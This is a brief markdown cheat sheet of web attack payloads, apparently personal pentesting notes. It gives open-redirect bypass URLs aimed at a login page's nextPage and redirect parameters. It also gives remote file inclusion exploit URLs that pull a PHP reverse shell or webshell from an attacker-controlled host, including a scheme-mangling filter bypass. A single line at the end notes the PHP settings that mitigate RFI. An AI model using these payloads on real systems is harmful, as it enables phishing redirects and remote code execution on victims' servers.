# Open Redirect

## Concept
- https://example.com/login/?nextPage=https://google.com => Allowed
- https://example.com/login/?nextPage=https://evilsite.com => Not allowed

## Payload
- https://example.com/login/?nextPage=https://evilsite.com/?google.com
- https://example.com/login/?redirect=https://www.evilsite.google.com
- https://example.com/login/?nextPage=https:///www.google.com@evilsite.com

## Remote File Inclusion
- Exploit
  - ```http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.72.200:9999/php-reverse-shell.php```
  - ```index.php?page=http://attackerIP/webshell.php``` 
  - ```index.php?page=htthttpp://attackerIP/webshell.php```
  - ```?page=hTTp://10.20.14.203/reverse.txt?```

- Mitigation
  -  Disable ```allow_url_fopen = On``` & ```allow_url_include = On```
